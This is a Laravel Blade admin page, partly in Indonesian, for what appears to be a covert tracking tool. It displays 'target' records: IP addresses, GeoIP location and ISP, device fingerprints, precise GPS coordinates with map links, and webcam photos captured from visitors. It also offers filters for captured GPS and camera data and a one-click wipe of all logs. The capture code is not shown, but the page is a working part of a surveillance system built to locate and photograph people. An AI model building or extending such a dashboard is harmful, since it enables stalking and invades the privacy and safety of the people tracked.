@extends('layouts.admin')

@section('title', 'Target Logs')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Top Header -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 p-4 sm:p-5 rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black shadow-neo">
        <div>
            <div class="flex items-center gap-2">
                <span class="px-2 py-0.5 rounded-md bg-pastel-purple border border-black text-[10px] font-mono font-bold uppercase shadow-neo-sm">
                    RECON RECORDS
                </span>
                <h1 class="text-xl sm:text-2xl font-black text-black tracking-tight">Target Intelligence Logs</h1>
            </div>
            <p class="text-zinc-600 text-xs sm:text-sm mt-1 font-medium">Detailed visitor telemetry, device fingerprints, and geolocation data.</p>
        </div>

        <div class="flex items-center gap-2">
            <form action="{{ route('admin.logs.clear') }}" method="POST" onsubmit="return confirm('Hapus SELURUH log telemetri dan foto snapshot? Tindakan ini permanen.');">
                @csrf
                <button type="submit" class="px-4 py-2.5 text-xs font-black bg-pastel-pink hover:bg-pink-300 text-black border-2 border-black rounded-xl shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center gap-1.5">
                    <i class="fa-solid fa-trash text-xs"></i>
                    <span>Clear All Logs</span>
                </button>
            </form>
        </div>
    </div>

    <!-- Filters & Search Bar -->
    <div class="p-4 sm:p-5 bg-[#FFFDF9] rounded-2xl border-[2.5px] border-black shadow-neo">
        <form action="{{ route('admin.logs') }}" method="GET" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            <div>
                <input type="text" name="search" value="{{ request('search') }}" placeholder="🔍 Search IP, City, ISP, UUID..."
                       class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm font-bold text-black placeholder-zinc-400 focus:outline-none focus:bg-pastel-yellow/30 shadow-neo-sm">
            </div>

            <div>
                <select name="filter_gps" class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm font-bold text-black focus:outline-none shadow-neo-sm cursor-pointer">
                    <option value="">-- All GPS Status --</option>
                    <option value="yes" {{ request('filter_gps') === 'yes' ? 'selected' : '' }}>📍 GPS Captured</option>
                    <option value="no" {{ request('filter_gps') === 'no' ? 'selected' : '' }}>❌ No GPS / Denied</option>
                </select>
            </div>

            <div>
                <select name="filter_cam" class="w-full px-4 py-2.5 bg-white border-2 border-black rounded-xl text-xs sm:text-sm font-bold text-black focus:outline-none shadow-neo-sm cursor-pointer">
                    <option value="">-- All Camera Status --</option>
                    <option value="yes" {{ request('filter_cam') === 'yes' ? 'selected' : '' }}>📸 Has Webcam Photos</option>
                </select>
            </div>

            <div class="flex gap-2">
                <button type="submit" class="flex-1 py-2.5 px-4 bg-pastel-lime hover:bg-pastel-limeDark text-black rounded-xl text-xs font-black uppercase tracking-wider border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center justify-center gap-1.5">
                    <i class="fa-solid fa-filter"></i> Apply Filter
                </button>
                @if(request()->hasAny(['search', 'filter_gps', 'filter_cam']))
                    <a href="{{ route('admin.logs') }}" class="py-2.5 px-3.5 bg-pastel-orange hover:bg-orange-300 text-black rounded-xl text-xs font-bold border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition flex items-center justify-center" title="Reset Filters">
                        <i class="fa-solid fa-rotate-left"></i>
                    </a>
                @endif
            </div>
        </form>
    </div>

    <!-- Logs Container -->
    <div class="rounded-2xl bg-[#FFFDF9] border-[2.5px] border-black overflow-hidden shadow-neo-lg">
        
        <!-- Desktop Table View (Hidden on mobile) -->
        <div class="hidden md:block overflow-x-auto scrollbar-slim touch-scroll">
            <table class="w-full text-left text-xs">
                <thead class="bg-cream-300 text-black uppercase font-mono text-[11px] font-black tracking-wider border-b-2 border-black">
                    <tr>
                        <th class="p-4">UUID / Target IP</th>
                        <th class="p-4">Location (GeoIP)</th>
                        <th class="p-4">Hardware & Specs</th>
                        <th class="p-4">GPS Coordinates</th>
                        <th class="p-4">Webcam</th>
                        <th class="p-4">Captured At</th>
                        <th class="p-4 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody class="divide-y-2 divide-black/10 text-zinc-800 font-medium">
                    @forelse($logs as $log)
                        <tr class="hover:bg-pastel-yellow/30 transition">
                            <td class="p-4 font-mono">
                                <div class="font-black text-black text-sm">{{ $log->ip }}</div>
                                <div class="text-[10px] text-purple-700 font-bold truncate max-w-[140px]" title="{{ $log->uuid }}">{{ $log->uuid }}</div>
                            </td>

                            <td class="p-4">
                                <div class="font-extrabold text-black">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                                <div class="text-[11px] text-zinc-600 font-bold">{{ $log->region_name ?? '' }} ({{ $log->country_code ?? '' }})</div>
                                <div class="text-[10px] text-zinc-500 truncate max-w-[180px]">{{ $log->isp ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                <div class="font-bold text-black">{{ $log->platform ?? 'Unknown OS' }}</div>
                                <div class="text-[11px] text-zinc-600 font-mono">Screen: {{ $log->screen_resolution ?? 'N/A' }}</div>
                                <div class="text-[10px] text-zinc-500 font-mono">RAM: {{ $log->ram ? $log->ram . 'GB' : 'N/A' }} | Cores: {{ $log->cpu_cores ?? 'N/A' }}</div>
                            </td>

                            <td class="p-4">
                                @if($log->gps_lat && $log->gps_lon)
                                    <div class="space-y-1">
                                        <div class="font-mono text-[11px] font-bold text-black">{{ $log->gps_lat }}, {{ $log->gps_lon }}</div>
                                        <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank"
                                           class="inline-flex items-center px-2.5 py-1 rounded-md bg-pastel-orange border border-black text-black text-[10px] font-bold shadow-neo-sm hover:shadow-none transition">
                                            <i class="fa-solid fa-map-location mr-1 text-red-600"></i> Google Maps
                                        </a>
                                    </div>
                                @elseif($log->gps_error)
                                    <span class="inline-flex items-center px-2 py-0.5 rounded text-[10px] font-bold font-mono bg-pastel-pink text-black border border-black shadow-neo-sm" title="{{ $log->gps_error }}">
                                        Denied / Error
                                    </span>
                                @else
                                    <span class="text-zinc-400 font-mono">-</span>
                                @endif
                            </td>

                            <td class="p-4">
                                @if($log->snapshots->isNotEmpty())
                                    <button onclick="viewSnapshots({{ $log->id }})" class="inline-flex items-center px-3 py-1 rounded-lg bg-pastel-lime border border-black text-black text-xs font-mono font-bold shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 transition">
                                        <i class="fa-solid fa-images mr-1.5"></i> {{ $log->snapshots->count() }} photos
                                    </button>
                                @else
                                    <span class="text-zinc-400 font-mono">0</span>
                                @endif
                            </td>

                            <td class="p-4 font-mono text-zinc-600 text-xs">
                                {{ $log->created_at->format('Y-m-d H:i') }}
                            </td>

                            <td class="p-4 text-right">
                                <div class="flex items-center justify-end gap-1.5">
                                    <button onclick="openDetailModal({{ $log->id }})" class="px-3 py-1.5 bg-white hover:bg-pastel-purple text-black rounded-lg border-2 border-black shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 text-xs font-black transition" title="Inspect Full Telemetry">
                                        <i class="fa-solid fa-eye"></i>
                                    </button>
                                    <form action="{{ route('admin.logs.delete', $log->id) }}" method="POST" onsubmit="return confirm('Delete this target record?');" class="inline">
                                        @csrf
                                        @method('DELETE')
                                        <button type="submit" class="px-3 py-1.5 bg-pastel-pink hover:bg-pink-300 text-black border-2 border-black rounded-lg shadow-neo-sm hover:shadow-neo active:translate-x-0.5 active:translate-y-0.5 text-xs font-bold transition" title="Delete">
                                            <i class="fa-solid fa-trash-can"></i>
                                        </button>
                                    </form>
                                </div>
                            </td>
                        </tr>
                    @empty
                        <tr>
                            <td colspan="7" class="p-12 text-center text-zinc-500 font-medium">
                                Tidak ada log yang cocok dengan filter atau pencarian Anda.
                            </td>
                        </tr>
                    @endforelse
                </tbody>
            </table>
        </div>

        <!-- Mobile Card List View (Optimized for Phones) -->
        <div class="md:hidden divide-y-2 divide-black/10 p-3 space-y-3">
            @forelse($logs as $log)
                <div class="p-4 rounded-xl bg-white border-2 border-black shadow-neo-sm space-y-3">
                    <div class="flex items-start justify-between gap-2">
                        <div>
                            <div class="font-black text-black font-mono text-sm">{{ $log->ip }}</div>
                            <div class="text-xs font-bold text-zinc-600">{{ $log->city ?? 'Unknown' }}, {{ $log->country ?? 'Unknown' }}</div>
                        </div>
                        <span class="text-[10px] text-zinc-600 font-mono font-bold bg-cream-300 px-2 py-0.5 rounded border border-black">{{ $log->created_at->diffForHumans() }}</span>
                    </div>

                    <div class="grid grid-cols-2 gap-2 text-[11px] bg-cream-100 p-2.5 rounded-xl border border-black font-mono">
                        <div>
                            <span class="text-zinc-500 block text-[9px] font-bold uppercase">DEVICE / OS</span>
                            <span class="text-black font-extrabold truncate block">{{ $log->platform ?? 'Unknown' }}</span>
                        </div>
                        <div>
                            <span class="text-zinc-500 block text-[9px] font-bold uppercase">ISP</span>
                            <span class="text-black font-extrabold truncate block">{{ $log->isp ?? 'N/A' }}</span>
                        </div>
                    </div>

                    <div class="flex items-center justify-between gap-2 pt-1">
                        <div>
                            @if($log->gps_lat && $log->gps_lon)
                                <a href="https://www.google.com/maps/place/{{ $log->gps_lat }},{{ $log->gps_lon }}" target="_blank" 
                                   class="px-2.5 py-1 bg-pastel-orange border border-black rounded-lg text-black font-bold text-xs flex items-center gap-1 shadow-neo-sm">
                                    <i class="fa-solid fa-map-location-dot text-red-600"></i> Maps
                                </a>
                            @elseif($log->gps_error)
                                <span class="px-2 py-0.5 rounded bg-pastel-pink border border-black text-[10px] font-bold">GPS: Denied</span>
                            @else
                                <span class="text-zinc-500 font-mono text-[10px]">GPS: None</span>
                            @endif
                        </div>

                        <div class="flex items-center gap-2">
                            @if($log->snapshots->isNotEmpty())
                                <button onclick="viewSnapshots({{ $log->id }})" class="px-2.5 py-1 rounded-lg bg-pastel-lime border border-black text-black font-bold text-xs font-mono shadow-neo-sm">
                                    <i class="fa-solid fa-camera mr-1"></i> {{ $log->snapshots->count() }}
                                </button>
                            @endif
                            <button onclick="openDetailModal({{ $log->id }})" class="px-3 py-1 bg-white hover:bg-pastel-purple text-black rounded-lg border-2 border-black text-xs font-black shadow-neo-sm">
                                Details
                            </button>
                            <form action="{{ route('admin.logs.delete', $log->id) }}" method="POST" onsubmit="return confirm('Delete this target record?');" class="inline">
                                @csrf
                                @method('DELETE')
                                <button type="submit" class="px-2.5 py-1 bg-pastel-pink text-black border border-black rounded-lg text-xs font-bold">
                                    <i class="fa-solid fa-trash-can"></i>
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            @empty
                <div class="p-8 text-center text-zinc-500 text-xs font-medium">
                    Tidak ada log yang cocok dengan filter atau pencarian Anda.
                </div>
            @endforelse
        </div>

        @if($logs->hasPages())
            <div class="p-4 border-t-2 border-black bg-cream-100">
                {{ $logs->links() }}
            </div>
        @endif
    </div>

</div>

<!-- Neo-Brutalist Telemetry Detail Modal -->
<div id="detailModal" class="fixed inset-0 z-50 bg-black/70 backdrop-blur-xs hidden items-center justify-center p-3 sm:p-4">
    <div class="bg-[#FFFDF9] border-[3px] border-black rounded-3xl max-w-2xl w-full p-5 sm:p-6 shadow-neo-xl space-y-4 max-h-[90vh] overflow-y-auto">
        <div class="flex items-center justify-between border-b-2 border-black pb-3">
            <h3 class="text-base sm:text-lg font-black text-black flex items-center gap-2">
                <span class="w-8 h-8 rounded-lg bg-pastel-purple border border-black flex items-center justify-center text-black text-sm shadow-neo-sm">
                    <i class="fa-solid fa-fingerprint"></i>
                </span>
                Target Telemetry Inspector
            </h3>
            <button onclick="closeDetailModal()" class="w-8 h-8 rounded-lg bg-pastel-orange border-2 border-black shadow-neo-sm text-black flex items-center justify-center font-bold active:translate-x-0.5 active:translate-y-0.5 active:shadow-none transition">
                <i class="fa-solid fa-xmark text-sm"></i>
            </button>
        </div>

        <div id="modalContent" class="space-y-4 text-xs font-mono">
            <div class="text-center py-8 text-zinc-500 font-bold">Loading details...</div>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
function openDetailModal(id) {
    const modal = document.getElementById('detailModal');
    const content = document.getElementById('modalContent');
    modal.classList.remove('hidden');
    modal.classList.add('flex');
    content.innerHTML = '<div class="text-center py-8 text-zinc-500"><i class="fa-solid fa-spinner fa-spin text-2xl mb-2 text-black"></i><div class="font-bold">Memuat rincian data target...</div></div>';

    fetch(`/admin/logs/${id}`)
        .then(r => r.json())
        .then(data => {
            const l = data.log;
            let snapsHtml = '';
            if (data.snapshots && data.snapshots.length > 0) {
                snapsHtml = '<div class="mt-4"><div class="text-black font-extrabold mb-2.5 flex items-center gap-2"><span class="w-6 h-6 rounded bg-pastel-lime border border-black flex items-center justify-center text-[10px]"><i class="fa-solid fa-camera"></i></span> CAPTURED WEBCAM PHOTOS:</div><div class="grid grid-cols-2 sm:grid-cols-3 gap-2.5">';
                data.snapshots.forEach(s => {
                    snapsHtml += `<a href="${s.url}" target="_blank" class="block aspect-video rounded-xl overflow-hidden border-2 border-black bg-black shadow-neo-sm hover:shadow-neo transition"><img src="${s.url}" class="object-cover h-full w-full hover:scale-105 transition" /></a>`;
                });
                snapsHtml += '</div></div>';
            }

            content.innerHTML = `
                <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-zinc-900">
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">IP ADDRESS</span>
                        <span class="text-black font-black text-sm break-all">${l.ip || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">GEO LOCATION</span>
                        <span class="font-extrabold">${l.city || 'N/A'}, ${l.country || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">ISP & ORG</span>
                        <span class="truncate block font-bold">${l.isp || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">PLATFORM / OS</span>
                        <span class="font-extrabold">${l.platform || 'N/A'}</span>
                    </div>
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">HARDWARE SPECS</span>
                        <span class="font-bold">RAM: ${l.ram ? l.ram + 'GB' : 'N/A'} | CPU: ${l.cpu_cores || 'N/A'} Cores</span>
                    </div>
                    <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                        <span class="text-zinc-500 block text-[9px] font-bold uppercase">SCREEN & LANGUAGE</span>
                        <span class="font-bold">${l.screen_resolution || 'N/A'} (${l.browser_language || 'N/A'})</span>
                    </div>
                </div>

                <div class="p-3 bg-white rounded-xl border-2 border-black shadow-neo-sm">
                    <span class="text-zinc-500 block text-[9px] font-bold uppercase mb-1">USER AGENT</span>
                    <span class="text-[11px] text-zinc-800 break-all leading-relaxed font-bold">${l.user_agent || 'N/A'}</span>
                </div>

                ${l.gps_lat ? `
                <div class="p-3 bg-pastel-orange rounded-xl border-2 border-black shadow-neo-sm space-y-2">
                    <span class="text-black font-black block text-[10px] tracking-wider">🛰️ HIGH-PRECISION GPS SATELLITE</span>
                    <div class="text-black font-bold">Lat: ${l.gps_lat}, Lon: ${l.gps_lon} (Accuracy: ${l.gps_accuracy || 'N/A'}m)</div>
                    <div class="flex items-center gap-3 pt-1">
                        <a href="https://www.google.com/maps/place/${l.gps_lat},${l.gps_lon}" target="_blank" class="px-3 py-1.5 bg-white border-2 border-black text-black rounded-lg text-xs font-black shadow-neo-sm hover:shadow-none transition flex items-center gap-1.5">
                            <i class="fa-solid fa-map-location text-red-600"></i> Open Google Maps
                        </a>
                        <a href="https://earth.google.com/web/search/${l.gps_lat},${l.gps_lon}" target="_blank" class="px-3 py-1.5 bg-white border-2 border-black text-black rounded-lg text-xs font-black shadow-neo-sm hover:shadow-none transition flex items-center gap-1.5">
                            <i class="fa-solid fa-globe text-blue-600"></i> Google Earth
                        </a>
                    </div>
                </div>` : ''}

                ${snapsHtml}
            `;
        });
}

function viewSnapshots(id) {
    openDetailModal(id);
}

function closeDetailModal() {
    const modal = document.getElementById('detailModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}
</script>
@endsection
